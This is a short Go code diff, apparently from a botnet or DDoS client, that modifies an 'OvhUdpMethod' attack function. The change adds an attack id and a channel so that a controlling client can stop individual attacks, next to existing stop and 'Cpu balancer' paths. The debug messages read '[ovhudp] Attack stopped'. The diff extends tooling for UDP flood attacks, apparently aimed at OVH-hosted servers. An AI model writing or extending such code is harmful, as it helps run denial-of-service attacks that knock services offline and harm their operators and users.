@@ -12,7 +12,7 @@ import (
 	"time"
 )
 
-func OvhUdpMethod(ctx context.Context, ipaddr, _port string) {
+func OvhUdpMethod(ctx context.Context, ipaddr, _port string, id int, ch chan int) {
 
 	defer Catch()
 
@@ -35,6 +35,15 @@ func OvhUdpMethod(ctx context.Context, ipaddr, _port string) {
 				fmt.Println("[ovhudp] Attack stopped")
 			}
 			return
+		case sid := <-ch:
+			if id == sid {
+				if config.DEBUG {
+					fmt.Println("[ovhudp] Attack stopped (by client)")
+				}
+				close(ch)
+				return
+			}
+
 		case <-utils.StopChan:
 			if config.DEBUG {
 				fmt.Println("[ovhudp] Cpu balancer")
